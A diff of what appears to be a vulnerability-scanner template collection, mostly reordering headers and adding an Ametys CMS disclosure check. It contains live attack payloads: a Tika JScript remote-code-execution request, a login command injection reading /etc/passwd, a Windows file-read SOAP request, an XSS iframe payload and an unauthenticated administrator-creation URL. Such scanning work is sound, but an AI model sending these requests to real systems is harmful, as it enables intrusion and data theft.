@@ -3286,7 +3286,7 @@
     {
       "id": "CVE-2014-6271",
       "info": {
-        "name": "ShellShock",
+        "name": "ShellShock - Remote Code Execution",
         "severity": "critical"
       },
       "requests": [
@@ -6125,11 +6125,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close"
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript"
           },
           "method": "PUT",
           "path": [
@@ -7032,7 +7032,7 @@
         {
           "method": "GET",
           "path": [
-            "{{BaseURL}}/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm"
+            "{{BaseURL}}/pages/includes/status-list-mo%3Ciframe%20src%3D%22javascript%3Aalert%28document.domain%29%22%3E.vm"
           ]
         }
       ]
@@ -10250,8 +10250,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "{{Hostname}}/module/login/login.html"
+            "Referer": "{{Hostname}}/module/login/login.html",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -10635,9 +10635,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
           },
           "method": "POST",
           "path": [
@@ -16212,6 +16212,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/Admin/Access/Setup/Default.aspx?Action=createadministrator&adminusername={{rand_base(6)}}&adminpassword={{rand_base(6)}}&adminemail=test@test.com&adminname=test"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-26159",
+      "info": {
+        "name": "Ametys CMS - Unauthenticated information disclosure",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plugins/web/service/search/auto-completion/domain/en.xml?q=adm"
           ]
         }
       ]
